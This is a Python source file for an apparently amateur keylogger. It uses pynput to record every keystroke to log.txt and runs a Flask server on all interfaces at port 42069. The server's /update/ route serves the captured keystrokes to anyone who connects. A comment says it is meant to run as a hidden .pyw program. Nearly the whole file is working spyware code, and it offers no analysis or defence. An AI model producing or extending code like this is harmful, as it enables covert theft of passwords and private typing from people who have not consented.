from pynput.keyboard import Key, Listener
import logging, time
from flask import Flask, render_template, jsonify

app = Flask(__name__)



@app.route('/')
def index():
  return render_template('page.html')

@app.route('/my-link/')
def my_link():
  return 'Click.'

@app.route('/service')
def service_actions():
    ##TO-Do: set this up to do somthing, maybe close idk
    ## set up a textbox or even better an box you click to close the server, bc I need a failsafe JIC to close the .pyw program
    print("The server os up and running")
    i = 0
    while i<20:
        print(str(i))
        print("\nLOL")
        i += 1
    return jsonify([1,2,3,4,5])

@app.route('/update/')
def updates():
    return open("log.txt", 'r') 



# def on_press(key):
#     logging.info(str(key))


# @app.route('/start/')
# def startLog():
#     print("Starting listener")
#     with Listener(on_press=on_press) as listener:
#         listener.join()
#         print("Started listening")
#     return "Done"



keys = []
  
def on_press(key):
     
    keys.append(key)
    write_file(keys)
     
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
         
    except AttributeError:
        print('special key {0} pressed'.format(key))
          
def write_file(keys):
     
    with open('log.txt', 'w') as f:
        for key in keys:
             
            # removing ''
            
            k = str(key).replace("'", "")
            if k == "Key.backspace":
                f.write("\n")
            elif k == "Key.enter":
                f.write("\n")
            else:
                f.write(k)      
                # explicitly adding a space after
                # every keystroke for readability
                f.write(' ')



@app.route('/nStart/')
def newStart():
    with Listener(on_press = on_press) as listener:
        listener.join()
    return "done"

log_dir = ""


if __name__ == '__main__': 
    app.run('0.0.0.0', 42069) 


